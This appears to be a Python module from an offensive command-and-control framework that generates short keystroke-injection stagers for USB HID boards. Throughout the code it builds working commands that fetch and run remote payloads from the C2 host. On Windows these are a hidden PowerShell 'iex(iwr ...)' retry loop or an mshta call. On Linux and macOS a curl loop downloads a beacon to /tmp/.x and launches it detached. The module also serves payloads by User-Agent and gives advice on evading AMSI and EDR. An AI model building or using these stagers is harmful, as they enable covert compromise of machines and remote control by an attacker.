"""short_stager.py — compact, resilient, hidden stagers for HID delivery.

``builder.generate_dropper`` emits the FULL resilient PIC stager: on Windows
that is ~11.4k characters. It is fine pasted by an operator into a shell, but
a USB HID board has to TYPE every character — 11k chars are minutes on
screen, fully visible, and HID boards drop keystrokes on long strings. For the
HID path we need the opposite:

  * SHORT     — small enough to type in seconds;
  * HIDDEN    — no console window on Windows;
  * RESILIENT — if the C2 is down the command is not lost: it retries on a
                timer and connects when the C2 comes back;
  * IN-MEMORY — the Windows payload is run from memory, never written to disk.

The trick that keeps all four at once: the TYPED command is only a short
fetcher, and the heavy stager script is served by the C2. The board types the
SAME short fetch on every OS, and the delivery endpoint decides what to serve
from the ``User-Agent`` — ``detect_platform`` is that decision, i.e. the piece
that lets ONE payload serve Windows, Linux and macOS without the board being
able to detect the OS itself (a keyboard cannot read the host back).

Resilience lives CLIENT-side as a retry loop, so it survives a cold C2:
the command keeps polling until the download succeeds, then breaks.
"""

from __future__ import annotations

import base64
import re
from typing import List, Optional, Tuple

# Windows loaders, ordered by a real trade-off (see `loader_notes`):
#   * "powershell" — hidden + a retry LOOP (resilient), no disk, but AMSI-visible
#                    text if the fetched script uses IEX/Add-Type;
#   * "mshta"      — the SHORTEST, runs an HTA with no console, but a single
#                    shot: it cannot loop, so it is NOT resilient by itself.
LOADERS = ("powershell", "mshta")

# default retry cadence (seconds) for the client-side loop
DEFAULT_RETRY_S = 30

# How many times the client-side loop may try before it gives up. BOUNDED on
# purpose: `while(1)` against a C2 that never answers is an invisible process
# retrying for ever on the target — no end, no error, nothing the operator can
# point at — and a single mistyped endpoint then costs the engagement. 20 x 30s
# is ten minutes, enough for a late C2, short enough to be accountable.
# Overridable per engagement: `c2.stager_attempts` / PHANTOM_STAGER_ATTEMPTS,
# or `--stager-attempts <n>` on the `payload hid` command.
DEFAULT_ATTEMPTS = 20

# The board TYPES the command on screen, one keystroke at a time. The full
# resilient PIC stager is ~11.4k chars (measured: an operator timed minutes of
# typing on a Leonardo): a long visible window, and boards drop keystrokes on
# long runs. This is the ceiling the download-mode command is held to, and
# `hid_download_command` refuses to hand back anything longer — "it is short"
# is the entire reason the download mode exists.
MAX_TYPED_CHARS = 600

# Where a SHORT stager fetches from. Two different KINDS of endpoint, one
# pairing to get right: Windows iex's a SCRIPT (the raw shellcode `/x` carries
# is not text), while the POSIX families fetch the compiled beacon directly.
# The pairing lives here, next to `build_short_stager`, so no call site can
# pick the wrong one.
_DOWNLOAD_ROUTES = {
    "windows": "/s/windows",
    "linux": "/api/v1/payload_linux",
    "macos": "/api/v1/payload_macos",
    "android": "/api/v1/payload_android",
}

_PLATFORMS = ("windows", "macos", "linux", "android")


def detect_platform(user_agent: Optional[str]) -> str:
    """The target OS a User-Agent most likely is (for server-side delivery).

    Conservative and substring-based on the tokens actually found in real
    browser/curl/wget UAs; anything unrecognised is ``"unknown"`` so a caller
    never serves a Windows payload to an unknown client by default.
    """
    ua = (user_agent or "").lower()
    if not ua:
        return "unknown"
    if "android" in ua:
        return "android"
    if "iphone" in ua or "ipad" in ua or "macintosh" in ua or "mac os" in ua:
        return "macos"
    if "windows" in ua or "win32" in ua or "win64" in ua or "wow64" in ua:
        return "windows"
    if "linux" in ua or "x11" in ua or "ubuntu" in ua or "debian" in ua:
        return "linux"
    return "unknown"


def payload_route(platform: str, *, pic: bool = False) -> str:
    """The C2 route that serves the beacon for ``platform``.

    ``pic=True`` returns the Windows in-memory XOR-wrapped PIC endpoint
    (``/x``); otherwise the platform's compiled-beacon route.
    """
    platform = (platform or "").lower()
    if platform == "windows":
        return "/x" if pic else "/api/v1/payload"
    if platform == "linux":
        return "/api/v1/payload_linux"
    if platform == "macos":
        return "/api/v1/payload_macos"
    if platform == "android":
        return "/api/v1/payload_android"
    return ""


def delivery_for(user_agent: Optional[str], base_url: str,
                 token: str = "") -> Tuple[str, str]:
    """(platform, url) the C2 should serve for this request.

    ``base_url`` is the C2 root (e.g. ``https://10.0.0.5:8443``); the token,
    when given, is appended as ``?auth=`` to match the existing stager URLs.
    Returns ``("unknown", "")`` when no platform can be determined, so the
    caller can 404 instead of guessing.
    """
    platform = detect_platform(user_agent)
    route = payload_route(platform)
    if not route:
        return platform, ""
    url = base_url.rstrip("/") + route
    if token:
        url += f"?auth={token}"
    return platform, url


def _win_retry_loop(inner: str, retry_s: int, attempts: int) -> str:
    """A BOUNDED one-liner retry loop around ``inner``.

    Runs ``inner`` until it succeeds or the attempt budget runs out, then
    returns — the shell exits instead of leaving a hidden process polling a
    dead endpoint for ever. The counter and the budget are both visible in
    the typed text, so an operator reading the artefact can tell how long the
    board's delivery window is.
    """
    gap = max(1, int(retry_s))
    tries = max(1, int(attempts))
    return (f"$i=0;while($i -lt {tries}){{try{{{inner};break}}catch{{$i++;"
            f"sleep {gap}}}}}")


def build_short_stager(platform: str, url: str, *,
                       host: str = "", port: int = 0, ssl: bool = True,
                       retry_s: int = DEFAULT_RETRY_S,
                       attempts: int = DEFAULT_ATTEMPTS,
                       loader: str = "powershell") -> str:
    """Build the SHORT typed command for one OS.

    Windows: a hidden PowerShell fetch with a client-side retry loop; the
    fetched script carries the heavy stager, so the typed text stays short.
    GNU/Linux and macOS: a ``sh`` loop that keeps curling until the beacon
    lands, then starts it detached with output dropped.

    Raises ``ValueError`` on an unknown platform/loader or an empty URL: a
    stager that cannot fetch is not a stager.
    """
    platform = (platform or "").lower()
    url = (url or "").strip()
    if not url:
        raise ValueError("short stager needs a delivery URL")
    if platform not in _PLATFORMS:
        raise ValueError(f"unknown platform {platform!r}: choose from "
                         f"{', '.join(_PLATFORMS)}")

    # The URL travels inside a quoted wrapper on every platform (`iwr '…'` on
    # Windows, `"…"` inside the single-quoted `sh -c` on POSIX). A quote in it
    # would END that wrapper early and hand the target a truncated command —
    # worse than a long one, because it looks right on screen and then fails
    # with nothing to read — and `$`/backtick would be EXPANDED by the shell
    # instead of fetched literally. Refusing here is cheap; finding it on a
    # board mid-engagement is not.
    for bad in ("'", '"', "$", "`"):
        if bad in url:
            raise ValueError(
                f"stager URL contains {bad!r}, which the typed command "
                f"cannot quote safely")

    if platform == "windows":
        loader = (loader or "powershell").lower()
        if loader not in LOADERS:
            raise ValueError(f"unknown loader {loader!r}: choose from "
                             f"{', '.join(LOADERS)}")
        if loader == "mshta":
            # shortest, windowless, but a single shot (cannot loop)
            return f'mshta "{url}"'
        fetch = ("iex(iwr '" + url + "' -UseB).Content")
        loop = _win_retry_loop(fetch, retry_s, attempts)
        return 'powershell -w h -c "' + loop + '"'

    # POSIX: sh -c '<loop>; <run detached>'
    #
    # The URL is DOUBLE-quoted even though the wrapper is SINGLE-quoted, and
    # that is deliberate rather than a quoting accident. Nesting the same
    # quote character is not a syntax error — adjacent quoted and unquoted
    # parts CONCATENATE, so `sh -c 'a 'b' c'` still hands sh one script — but
    # the URL comes out of it UNQUOTED, i.e. subject to word splitting and
    # pathname globbing inside the script, and the `?` of `?auth=<token>` is a
    # glob character. Distinct quoting keeps the URL one literal word; the
    # characters a double-quoted URL would let the shell EXPAND (`$`, backtick,
    # quotes) are refused above, so this is strictly the narrower form.
    #
    # -f turns an HTTP error (403/404) into a curl FAILURE, so the loop keeps
    # retrying instead of chmod-ing an error page and calling it delivered.
    # -k skips cert verification (self-signed C2) and is only meaningful over
    # TLS, so it is added solely for the https case.
    flags = "sf" + ("k" if ssl else "")
    out = "/tmp/.x"
    run = (f"{out} {host} {int(port)} {1 if ssl else 0}"
           if host else f"{out}")
    # Same budget as the Windows loader, and the same reason: after `tries`
    # failed fetches the script EXITS instead of polling a dead endpoint for
    # ever. The counter lives inside the single-quoted wrapper, so the outer
    # shell never sees it.
    gap = max(1, int(retry_s))
    tries = max(1, int(attempts))
    inner = (f'i=0;while ! curl -{flags} "{url}" -o {out};do i=$((i+1));'
             f'[ $i -ge {tries} ]&&exit 1;sleep {gap};done;'
             f'chmod +x {out};nohup {run} >/dev/null 2>&1 &')
    return "sh -c '" + inner + "'"


def build_universal_fetch(url: str) -> str:
    """The ONE typed string that is identical on every OS: the URL itself.

    Meant for the browser-delivery path: the operator's opener (Win+R on
    Windows, Alt+F2 on GNOME/XFCE, Cmd+Space on macOS) puts a run/search box
    on screen, the board types only ``url``, and the server - by
    ``detect_platform`` - decides what to return. This is the closest thing
    to "one payload for all OSes" a keyboard board can offer.
    """
    url = (url or "").strip()
    if not url:
        raise ValueError("universal fetch needs a URL")
    return url


def _configured_attempts() -> int:
    """How many fetches the client-side loop may spend, per engagement."""
    try:
        from phantom.utils import config as cfg
        return max(1, cfg.get_int("c2.stager_attempts", DEFAULT_ATTEMPTS,
                                  env="PHANTOM_STAGER_ATTEMPTS"))
    except Exception:
        return DEFAULT_ATTEMPTS


def _base64_blobs(text: str) -> List[str]:
    """Base64-looking tokens long enough to be a payload, not a word."""
    return [m.group(0) for m in
            re.finditer(r"[A-Za-z0-9+/]{40,}={0,2}", text or "")]


def _decode_layer(text: str) -> str:
    """Everything a layer of base64 hides, plus the layer itself."""
    out = [text or ""]
    for blob in _base64_blobs(text):
        try:
            raw = base64.b64decode(blob + "=" * (-len(blob) % 4))
        except Exception:
            continue
        for enc in ("utf-16-le", "utf-8"):
            try:
                decoded = raw.decode(enc)
            except (UnicodeDecodeError, ValueError):
                continue
            if decoded.isprintable() or "\n" in decoded:
                out.append(decoded)
                break
    return "\n".join(out)


def endpoint_from_registered_command(
        command: str) -> Optional[Tuple[str, int, bool]]:
    """(host, port, use_ssl) the command `--from-payload` would type targets.

    That command was built for ONE endpoint, and it is the only one its beacon
    will ever call back to. A short stager pointed at the CURRENT session
    config instead would fetch a beacon built for somewhere else — the kind of
    mismatch that looks fine in the artefact and fails on the target — so the
    endpoint is READ OUT of the registered command.

    `generate` nests base64 (a `-Enc` launcher on Windows; on POSIX an
    `echo <b64> | base64 -d | sh` around a script that carries the command
    again), so this peels a few layers and scans everything it finds. Returns
    None when no layer yields a URL, so the caller can REFUSE instead of
    quietly typing a fetcher pointed at the wrong listener.
    """
    text = command or ""
    for _ in range(4):
        widened = _decode_layer(text)
        if widened == text:
            break
        text = widened
    match = re.search(r"(https?)://([^/:\s]+):(\d{1,5})", text)
    if not match:
        return None
    scheme, host, port = match.group(1), match.group(2), int(match.group(3))
    if not re.fullmatch(r"[A-Za-z0-9._\-]+", host):
        return None
    if not 0 < port < 65536:
        return None
    # The SCHEME travels with the endpoint: a payload built for http:// must
    # keep fetching over http://, or the short stager reintroduces the very
    # mismatch it exists to avoid.
    return host, port, scheme == "https"


def download_route(platform: str) -> str:
    """The C2 route the TYPED short command fetches for ``platform``.

    ``""`` for a platform we have no artefact for, so a caller can refuse
    instead of guessing an endpoint.
    """
    return _DOWNLOAD_ROUTES.get((platform or "").lower(), "")


def short_stager_url(platform: str, base_url: str, token: str = "") -> str:
    """The URL `build_short_stager` needs for ``platform``.

    Windows gets the SCRIPT route, the POSIX families the binary one. Handing
    the Windows (``iex``) form a route that serves a PE would have PowerShell
    evaluate a binary as source — which is the mistake this function exists
    to make impossible. Raises ``ValueError`` on a platform with no route or
    an empty base URL.
    """
    route = download_route(platform)
    if not route:
        raise ValueError(f"no download route for platform {platform!r}")
    base = (base_url or "").strip().rstrip("/")
    if not base:
        raise ValueError("short stager needs a base URL")
    url = base + route
    if token:
        url += f"?auth={token}"
    return url


def hid_download_command(platform: str, host: str, port: int, *,
                         token: str = "", ssl: bool = True,
                         retry_s: int = DEFAULT_RETRY_S,
                         attempts: Optional[int] = None) -> str:
    """The command a HID board types in ``--stager-mode download``.

    ONE function decides the endpoint, the fetch and the length cap, so the
    HID path cannot drift from the C2 route that serves the artefact. Raises
    ``ValueError`` when the result would not fit the HID budget: an operator
    already holding a board needs a refusal, not a three-minute typing
    session they cannot see the end of.

    Download is the HID DEFAULT — the board types a fetcher and the beacon is
    downloaded — which is the opposite of what the paste-a-one-liner channels
    want (nothing is typed there, so an inline dropper costs them nothing).
    """
    platform = (platform or "").lower()
    if platform not in _PLATFORMS:
        raise ValueError(f"unknown platform {platform!r}: choose from "
                         f"{', '.join(_PLATFORMS)}")
    if platform == "android":
        # A USB keyboard board has nothing to inject into on Android and
        # cannot install an APK for you: it is an HTTP channel, so a "typed
        # fetcher" is not a delivery path there. Refusing beats handing back
        # a POSIX curl loop aimed at an APK.
        raise ValueError(
            "Android is not a HID channel (no keyboard to type into, and a "
            "board cannot install the APK): deliver it over HTTP with the "
            "android stager, not with --stager-mode")
    tries = _configured_attempts() if attempts is None else max(1, int(attempts))
    scheme = "https" if ssl else "http"
    url = short_stager_url(platform, f"{scheme}://{host}:{int(port)}", token)
    command = build_short_stager(platform, url, host=host, port=int(port),
                                 ssl=ssl, retry_s=retry_s, attempts=tries)
    if len(command) > MAX_TYPED_CHARS:
        raise ValueError(
            f"the {platform} download stager is {len(command)} chars, over "
            f"the {MAX_TYPED_CHARS}-char HID budget (an over-long host "
            f"{host!r} is the usual cause) — shorten the address, or use "
            f"--stager-mode inline")
    return command


def loader_notes(platform: str, loader: str = "powershell") -> Tuple[str, ...]:
    """The honest trade-off of each Windows loader, for the operator."""
    if (platform or "").lower() != "windows":
        return ()
    if (loader or "").lower() == "mshta":
        return ("shortest and windowless, but a SINGLE shot: mshta cannot "
                "loop, so a cold C2 means a lost payload",
                "mshta is monitored by several EDRs - prefer it only when "
                "you can confirm the C2 is UP at delivery time")
    return ("hidden PowerShell with a CLIENT-side retry loop: survives a cold "
            "C2 and writes nothing to disk",
            "the fetched script must avoid Add-Type/IEX-per-line literals: "
            "AMSI sees the script text (the short command itself is clean)")
